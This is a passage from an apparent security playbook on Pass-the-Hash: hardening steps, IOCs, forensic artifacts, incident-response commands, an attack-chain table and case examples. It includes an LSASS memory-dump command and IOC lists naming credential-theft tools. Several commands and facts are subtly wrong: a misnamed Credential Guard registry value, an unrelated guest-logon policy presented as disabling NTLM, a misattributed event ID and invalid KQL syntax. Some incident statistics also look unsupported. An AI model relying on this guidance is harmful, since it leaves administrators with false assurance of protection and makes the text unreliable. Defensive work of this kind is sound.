$CredGuardPath = 'HKLM:\System\CurrentControlSet\Control\Lsa'
if (-not (Test-Path $CredGuardPath)) { New-Item -Path $CredGuardPath -Force | Out-Null }
Set-ItemProperty -Path $CredGuardPath -Name 'LsaProtectedProcess' -Value 1 -Type DWord

# Verify UEFI Secure Boot is enabled
Confirm-SecureBootUEFI

# Restart
Restart-Computer -Force
```

**Validation Command:**
```powershell
$CredGuardStatus = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\microsoft\windows\deviceguard
$CredGuardStatus.CredentialGuardStatus  # Should return 1 (Running)
```

**Expected Output (If Secure):**
```
CredentialGuardStatus : 1
```

**What to Look For:**
- If CredentialGuardStatus = 1, Credential Guard is running and protecting NTLM hashes.
- If CredentialGuardStatus = 0 or null, Credential Guard is not running; Mimikatz can extract hashes.

**Impact:** Blocks NTLM hash extraction via Mimikatz; requires mandatory use of Windows Hello for Business or smart cards.

---

**2. Implement Network Segmentation (Restrict Lateral Movement Paths)**

Segment the network into zones (e.g., Tier 0 = DCs/admins, Tier 1 = servers, Tier 2 = workstations). Use firewalls and VLANs to restrict traffic flow between tiers.

**Applies To Versions:** All environments (network-level control, platform-agnostic)

**Manual Steps (Windows Firewall – Block SMB from Tier 2 to Tier 0):**
1. Open **Group Policy Management Console**
2. Create a new GPO: **Block SMB Tier2 to Tier0**
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Windows Defender Firewall with Advanced Security** → **Outbound Rules**
4. Click **New Rule** → **Custom**
5. Configure:
   - **Protocol:** TCP
   - **Local Port:** Any
   - **Remote Port:** 445 (SMB)
   - **Remote IP:** `<IP subnet of Tier 0 servers>`
   - **Action:** Block
6. Click **Finish**
7. Link this GPO to Tier 2 workstations

**Manual Steps (Azure/Cloud – Network Security Groups):**
1. Navigate to **Azure Portal** → **Network Security Groups**
2. Select the NSG for your network
3. Click **Inbound rules**
4. Click **+ Add** → **Add inbound security rule**
5. Configure:
   - **Source:** Tier 2 workstation subnet (e.g., 10.0.2.0/24)
   - **Destination:** Tier 0 server subnet (e.g., 10.0.0.0/24)
   - **Service:** SMB (port 445)
   - **Action:** Deny
6. Click **Add**

**Validation Command:**
```powershell
# Test SMB connectivity from Tier 2 to Tier 0
$NetTest = Test-NetConnection -ComputerName <Tier0_Server_IP> -Port 445
if ($NetTest.TcpTestSucceeded -eq $false) { Write-Host "SMB blocked successfully" }
```

**Impact:** Prevents lateral movement via SMB even if hashes are compromised; forces attackers to use alternative vectors.

---

**3. Disable NTLM on Critical Systems (Force Kerberos)**

NTLM is the protocol exploited by Pass-the-Hash. Kerberos (the modern alternative) uses tickets instead of hashes and is resistant to PtH.

**Applies To Versions:** Server 2016-2025, Windows 10-11

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console**
2. Navigate to: **Computer Configuration** → **Administrative Templates** → **Network** → **Lanman Workstation**
3. Double-click **Enable insecure guest logons**
4. Set to: **Disabled**
5. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
6. Double-click **Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers**
7. Set to: **Deny All**
8. Click **Apply** → **OK**
9. Run `gpupdate /force`
10. Restart computers

**Manual Steps (PowerShell – Server 2022+):**
```powershell
# Disable NTLM outbound
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\MSV1_0' `
  -Name 'RestrictSendingNTLMTraffic' -Value 2 -Type DWord

# Verify
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\MSV1_0' | Select-Object RestrictSendingNTLMTraffic
```

**Validation Command:**
```powershell
# Check if Kerberos is in use
klist  # Should show Kerberos tickets, not NTLM

# Monitor Event ID 4957 (NTLM blocked)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=4957} | Measure-Object
```

**Expected Output (If Secure):**
```
Kerberos tickets present; no NTLM hashes in cache.
```

**Impact:** Forces use of Kerberos; Pass-the-Hash attacks fail because no NTLM hashes are available for reuse.

---

### Priority 2: HIGH

**4. Enforce Multi-Factor Authentication (MFA) on Sensitive Accounts**

MFA prevents attackers from using stolen credentials (even with valid hashes) without the second factor.

**Manual Steps (Entra ID / Azure AD):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Configure:
   - **Name:** `Require MFA for All Users`
   - **Users:** Select **All users**
   - **Cloud apps:** Select **All cloud apps**
   - **Conditions:** Set as needed (e.g., all locations, all platforms)
   - **Grant:** Require **Multi-factor authentication**
4. Enable policy: **On**
5. Click **Create**

**Manual Steps (On-Premises AD – Azure MFA Server, deprecated; use Entra MFA instead):**
1. Migrate AD-joined computers to Hybrid Azure AD join
2. Configure Conditional Access policies (see above)
3. Users will be prompted for MFA when authenticating to cloud resources

**Validation:**
```powershell
# Check MFA status for a user
Connect-MgGraph
Get-MgUser -Filter "userPrincipalName eq 'user@domain.com'" | 
    Select-Object UserPrincipalName, @{N='MFAEnabled'; E={$_.StrongAuthenticationRequirements.Length -gt 0}}
```

**Impact:** Stolen NTLM hashes alone are insufficient; attacker still needs the second factor.

---

**5. Remove Local Administrator Privileges from User Workstations**

Local admin rights enable Mimikatz execution and hash extraction. Removing them forces attackers to find alternative privilege escalation vectors.

**Applies To Versions:** All Windows versions

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console**
2. Create a new GPO: **Remove Local Admin Rights**
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Restricted Groups**
4. Right-click **Restricted Groups** → **Add Group**
5. Add group: **Administrators**
6. Under **This group is a member of:** → Add domain group that should have admin (e.g., IT_Admins)
7. Under **Members of this group:** → Remove default users; add only IT_Admins
8. Click **OK** → **Apply**
9. Link to all workstation OUs

**Alternative (PowerShell Remediation):**
```powershell
# Remove all users except Domain Admins from local Administrators group
$AdminGroup = [ADSI]"WinNT://localhost/Administrators"
$Members = $AdminGroup.psbase.Invoke("Members") | ForEach-Object { $_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null) }

foreach ($Member in $Members) {
    if ($Member -notlike '*Domain Admins*' -and $Member -notlike '*Administrator*') {
        $AdminGroup.psbase.Invoke("Remove", ([ADSI]"WinNT://$Member").path)
    }
}
```

**Validation:**
```powershell
net localgroup Administrators  # Should show only IT admins and domain admins
```

**Impact:** Hash extraction requires local admin first; this raises the bar for attackers.

---

### Priority 3: MEDIUM

**6. Enable Kerberos Armor (FAST) on Domain Controllers**

Kerberos Flexible Authentication Secure Tunneling (FAST) protects pre-authentication traffic and mitigates certain Kerberos attacks, including Pass-the-Ticket variants.

**Manual Steps (Group Policy):**
1. On **Domain Controller**, open **Group Policy Management Console**
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Kerberos Policy**
3. Double-click **Kerberos client support for future armor types**
4. Set to: **Supported**
5. Double-click **Kerberos server support for fast armor**
6. Set to: **Supported**
7. Click **Apply** → **OK**
8. Run `gpupdate /force` on all domain controllers

**Validation:**
```powershell
# Check FAST configuration
$FastPath = 'HKLM:\System\CurrentControlSet\Services\KDC'
Get-ItemProperty -Path $FastPath | Select-Object EstimatedClientClockSkew, KdcProxyDisabled
```

---

**7. Monitor and Alert on Credential Access Attempts**

Configure SIEM to detect patterns consistent with hash extraction and Pass-the-Hash.

**Manual Steps (Microsoft Sentinel):**
1. Create alert rules (see Section 9 above)
2. Configure **Playbooks** to auto-respond:
   - Disable affected user account
   - Force password reset
   - Isolate compromised machine from network
3. Set up **Workbooks** for visualization of Logon Type 3 events and source IPs

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- Mimikatz executable: `mimikatz.exe` (or variants like `m.exe`, `mimikat.exe`)
- CrackMapExec binary: `crackmapexec.exe`, `cme.exe`
- Invoke-WMIExec script: `Invoke-WMIExec.ps1`, `Invoke-TheHash.ps1`
- Extracted hashes: Text files in temp directories (e.g., `C:\Temp\hashes.txt`, `C:\Windows\Temp\creds.txt`)

**Registry:**
- Mimikatz registry modifications: `HKLM\System\CurrentControlSet\Control\Lsa\LsaProtectedProcess` (set to 0 to bypass Credential Guard)
- Cached credentials: `HKLM\Security\Cache` (cleartext logon caches)

**Network:**
- SMB traffic (port 445) from workstation to domain controller or sensitive server
- RDP connections (port 3389) from unusual source IPs
- WMI connections (port 135, 445) from workstations to servers outside normal admin patterns
- NTLM authentication frames with mismatched source/destination user contexts

---

### Forensic Artifacts

**Disk:**
- Windows Event Log: `C:\Windows\System32\winevt\Logs\Security.evtx` (contains 4624, 4768, 4769, 4648 events)
- Mimikatz temporary files: `C:\Windows\Temp\*`, `C:\Users\*\AppData\Local\Temp\*`
- PowerShell Script Block Log: `C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`

**Memory:**
- LSASS process dump shows NTLM hashes and Kerberos tickets
- Named pipes: `\\.\pipe\*` (SMB lateral movement creates named pipes for authentication)
- Injected DLL in LSASS: Signature of injected code (if Mimikatz used DLL injection method)

**Cloud (Azure/M365):**
- Azure AD Sign-in Logs: User signing in from unusual location or with unusual token
- Audit Logs (Azure Portal): Unusual account creation, role assignment, or resource access
- Microsoft Sentinel: 4624, 4768, 4769 events forwarded from on-premises domain controllers

**MFT/USN Journal:**
- Mimikatz executable creation timestamp: Indicates when attack was staged
- Temporary credential dump files: Creation time, modification time, deletion time

---

### Response Procedures

**1. Immediate Isolation**

**Objective:** Stop lateral movement and prevent further compromise.

**Command (Disconnect network adapter):**
```powershell
Disable-NetAdapter -Name "Ethernet" -Confirm:$false -ErrorAction SilentlyContinue
```

**Manual (Azure VM):**
1. Navigate to **Azure Portal** → **Virtual Machines**
2. Select affected VM
3. Click **Networking**
4. Click the network interface name
5. Click **Network security group**
6. Add **Inbound rule:** Source = Any, Destination = This VM, Action = Deny
7. This effectively isolates the VM while preserving evidence

**2. Collect Evidence**

**Command (Export Security Event Log):**
```powershell
wevtutil epl Security "C:\Evidence\Security.evtx"
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624 or EventID=4768 or EventID=4769 or EventID=4648]]" | 
    Export-Csv -Path "C:\Evidence\PtH_Events.csv"
```

**Command (Dump LSASS memory for forensic analysis):**
```cmd
procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp
```

**Manual (Event Viewer):**
1. Open **Event Viewer**
2. Right-click **Security** → **Save All Events As**
3. Save to `C:\Evidence\Security.evtx`

**3. Remediate Compromised Credentials**

**Command (Force password reset):**
```powershell
Set-ADUser -Identity "VICTIM_USER" -ChangePasswordAtLogon $true
```

**Manual (Entra ID):**
1. Navigate to **Azure Portal** → **Entra ID** → **Users**
2. Select affected user
3. Click **Reset password**
4. Generate temporary password; force user to change at next logon

**4. Invalidate Compromised Tokens**

**Command (Revoke all sessions):**
```powershell
Revoke-AzUserSignInSession -UserId "user@domain.com"
```

**Manual (Entra ID):**
1. Navigate to **Azure Portal** → **Entra ID** → **Users**
2. Select affected user
3. Click **Sessions** → **Sign out all sessions**

**5. Hunt for Additional Compromises**

**KQL Query (Find all NTLM logons by compromised user in last 24h):**
```kusto
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| where Account == "CORP\\VICTIM_USER"
| where TimeGenerated > ago(24h)
| group-by Computer
```

**Expected Output:**
```
List of all systems this user authenticated to in last 24 hours
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes user into approving device code, gaining foothold |
| **2** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS Dumping | After establishing admin access, attacker dumps NTLM hashes from memory |
| **3** | **Current: Lateral Movement** | **[LM-AUTH-001] Pass-the-Hash** | **Using stolen hashes, attacker authenticates to domain controller and other systems** |
| **4** | **Privilege Escalation** | [CA-KERB-003] Golden Ticket Creation | With DA access, attacker extracts KRBTGT hash and creates persistent golden tickets |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates hidden admin account for long-term access |
| **6** | **Impact** | [COL-DATA-001] Data Exfiltration via Teams | Attacker exfiltrates sensitive data through compromised Teams account |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: APT41 – Command and Control via Pass-the-Hash

**Target:** Healthcare provider (MSP supply chain)  
**Timeline:** May 2021 – February 2022  
**Technique Status:** Active (still used as of 2025)

**Attack Flow:**
1. APT41 compromised an MSP's central management server via supply chain attack
2. Using local admin privileges, they dumped password hashes from LSASS using Windows Credential Editor (WCE)
3. They performed Pass-the-Hash attacks against the healthcare provider's domain controllers and file servers
4. Within 48 hours, they had domain admin privileges
5. They deployed BADHATCH (custom C2 tool) for persistence

**Impact:** Breach of 3.5 million patient records; operational downtime; $18M remediation cost

**Detection Failure:** The organization lacked centralized logging; local Event Logs were the only evidence, which was overwritten within 24 hours

**Reference:** [Mandiant – APT41 Supply Chain Attack](https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits)

---

### Example 2: Wizard Spider – Lateral Movement to Ransomware

**Target:** Financial services firm  
**Timeline:** January 2020 – March 2020  
**Technique Status:** Active

**Attack Flow:**
1. Initial access: Phishing email with Emotet malware
2. Emotet established SYSTEM shell on infected workstation
3. Attacker used Mimikatz to dump NTLM hashes
4. Performed Pass-the-Hash to domain controller (using domain admin hash)
5. Deployed Ryuk ransomware via Group Policy Objects (GPOs) to all systems
6. Full network encryption within 6 hours

**Impact:** $21M ransomware demand; operational shutdown for 3 weeks

**Detection Failure:** No EDR on endpoints; Windows Defender was disabled; Event Log forwarding was not configured

**Reference:** [Crowdstrike – Wizard Spider Case Study](https://www.crowdstrike.com/blog/wizard-spider-post-exploitation-lack-of-access/)

---

### Example 3: Scattered Spider – Cloud Lateral Movement via Pass-the-Hash (2023-2024)

**Target:** Multi-tenant cloud provider  
**Timeline:** December 2023 – March 2024  
**Technique Status:** Partial (hybrid/cloud variant)

**Attack Flow:**
1. Initial access: Social engineering of help desk contractor
2. Contractor's credentials phished; password reset via self-service portal
3. Attacker used PRT (Primary Refresh Token) abuse to access Azure portal
4. In Azure, extracted service principal credentials
5. Used service principal tokens to authenticate as cloud admin
6. Moved laterally to on-premises via Azure AD Connect sync account compromise

**Impact:** Customer data exfiltration; multi-tenant environment compromise; breach of 1000+ organizations

**Detection Gap:** Scattered Spider evaded detection by using legitimate cloud APIs; Pass-the-Hash was not the primary vector, but the same authentication bypass principles applied

**Reference:** [Microsoft Threat Intelligence – Scattered Spider](https://www.microsoft.com/en-us/security/blog/2023/12/09/scattered-spider-the-modus-operandi/)

---

## 15. REFERENCES & EXTERNAL RESOURCES

### Tools
- [Mimikatz GitHub – Sekurlsa::pth](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
- [CrackMapExec GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- [Invoke-TheHash (Kevin Robertson)](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [Windows Credential Editor (WCE)](https://www.ampliasecurity.com/research/windows-credential-editor/)

### Detection & Monitoring
- [Microsoft – Event ID 4624](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624)
- [Microsoft – Event ID 4768](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [Atomic Red Team – T1550.002](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.md)

### Academic & Threat Intelligence
- [MITRE ATT&CK – T1550.002](https://attack.mitre.org/techniques/T1550/002/)
- [Sempris – Pass the Hash Explained](https://www.semperis.com/blog/pass-the-hash-attack-explained/)
- [Red Canary – Lateral Movement Techniques](https://redcanary.com/blog/lateral-movement-techniques/)
- [Praetorian – Inside Mimikatz (Part 2)](https://www.praetorian.com/blog/inside-mimikatz-part2/)

### Mitigations
- [Microsoft – Restrict NTLM Group Policy](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-restrict-ntlm-authentication-in-this-domain)
- [CIS Benchmark – Windows Server 2022](https://www.cisecurity.org/benchmark/microsoft_windows_server_2022/)
- [DISA STIG – Windows Server 2016 / 2019 / 2022 / 2025](https://public.cyber.mil/stigs/downloads/)

---